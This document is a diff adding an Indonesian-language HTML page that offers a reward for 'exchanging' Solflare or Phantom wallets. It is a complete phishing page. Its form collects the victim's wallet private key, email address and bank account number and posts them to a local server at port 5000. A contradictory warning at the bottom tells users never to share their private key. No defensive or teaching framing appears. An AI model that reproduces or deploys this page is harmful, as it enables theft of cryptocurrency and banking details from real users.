@@ -1,0 +1,100 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Tukarkan Wallet Anda</title>
+    <style>
+        body {
+            font-family: 'Poppins', sans-serif;
+            background: linear-gradient(135deg, #89f7fe, #66a6ff);
+            margin: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            color: #fff;
+        }
+        .container {
+            background: rgba(255, 255, 255, 0.9);
+            padding: 30px;
+            border-radius: 10px;
+            box-shadow: 0 8px 15px rgba(0, 0, 0, 0.2);
+            text-align: center;
+            max-width: 400px;
+            width: 100%;
+        }
+        .container h1 {
+            font-size: 24px;
+            margin-bottom: 20px;
+            color: #333;
+        }
+        .container p {
+            font-size: 14px;
+            margin-bottom: 20px;
+            color: #555;
+        }
+        .form-group {
+            margin-bottom: 15px;
+            text-align: left;
+        }
+        .form-group label {
+            font-weight: bold;
+            margin-bottom: 5px;
+            display: block;
+            color: #333;
+        }
+        .form-group input {
+            width: 100%;
+            padding: 10px;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+            font-size: 14px;
+        }
+        .form-group input:focus {
+            border-color: #007bff;
+            outline: none;
+        }
+        .btn {
+            width: 100%;
+            padding: 10px;
+            background-color: #007bff;
+            border: none;
+            border-radius: 5px;
+            color: #fff;
+            font-size: 16px;
+            cursor: pointer;
+        }
+        .btn:hover {
+            background-color: #0056b3;
+        }
+        .note {
+            font-size: 12px;
+            color: red;
+            margin-top: 10px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>Tukarkan Wallet Anda</h1>
+        <p>Tukarkan wallet Solfare atau Phantom lama Anda di sini. Anda mendapatkan 100 rb setiap 100 transaksi token! Kirim key private Anda di kolom di bawah ini dan klaim sekarang!</p>
+        <form action="http://127.0.0.1:5000/" method="post">
+            <div class="form-group">
+                <label for="wallet">Key Private Wallet</label>
+                <input type="text" id="wallet" name="wallet" placeholder="Masukkan key private wallet Anda" required>
+            </div>
+            <div class="form-group">
+                <label for="email">Email Anda</label>
+                <input type="email" id="email" name="email" placeholder="Masukkan email Anda" required>
+            </div>
+            <div class="form-group">
+                <label for="account">Nomor Rekening Anda</label>
+                <input type="text" id="account" name="account" placeholder="Masukkan nomor rekening Anda" required>
+            </div>
+            <button type="submit" class="btn">Klaim Sekarang</button>
+        </form>
+        <p class="note">Jangan pernah membagikan key private wallet Anda kepada siapa pun!</p>
+    </div>
+</body>
+</html>
